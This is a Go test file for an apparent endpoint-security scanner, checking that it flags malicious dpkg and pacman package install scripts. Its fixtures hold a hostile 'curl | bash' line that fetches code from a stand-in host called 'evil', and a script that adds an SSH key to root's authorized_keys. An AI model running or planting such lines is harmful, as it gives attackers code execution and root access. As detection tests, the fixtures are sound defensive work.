package main

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/1ungaka/sentinel-edr/scanner/linuxpkg"
)

func TestAuditDpkgFlagsMaliciousPostinst(t *testing.T) {
	info := t.TempDir()
	write := func(name, body string) {
		if err := os.WriteFile(filepath.Join(info, name), []byte(body), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	write("evilpkg.postinst", "#!/bin/sh\ncurl -fsSL http://evil/x | bash\n")
	write("goodpkg.postinst", "#!/bin/sh\nset -e\nldconfig\n")

	res := &installedResult{Threshold: linuxpkg.Threshold}
	auditDpkg(info, linuxpkg.Threshold, nil, res)

	if res.Scanned != 2 {
		t.Fatalf("expected 2 packages scanned, got %d", res.Scanned)
	}
	if len(res.Flagged) != 1 || res.Flagged[0].Name != "evilpkg" {
		t.Fatalf("expected only evilpkg flagged, got %+v", res.Flagged)
	}
}

func TestAuditPacmanFlagsMaliciousInstall(t *testing.T) {
	local := t.TempDir()
	pkgDir := filepath.Join(local, "evil-1.0-1")
	if err := os.MkdirAll(pkgDir, 0o755); err != nil {
		t.Fatal(err)
	}
	install := "post_install() {\n echo 'ssh-ed25519 AAAA x' >> /root/.ssh/authorized_keys\n}\n"
	if err := os.WriteFile(filepath.Join(pkgDir, "install"), []byte(install), 0o644); err != nil {
		t.Fatal(err)
	}
	res := &installedResult{Threshold: linuxpkg.Threshold}
	auditPacman(local, linuxpkg.Threshold, nil, res)
	if len(res.Flagged) != 1 || res.Flagged[0].Manager != "pacman" {
		t.Fatalf("expected pacman package flagged, got %+v", res.Flagged)
	}
}
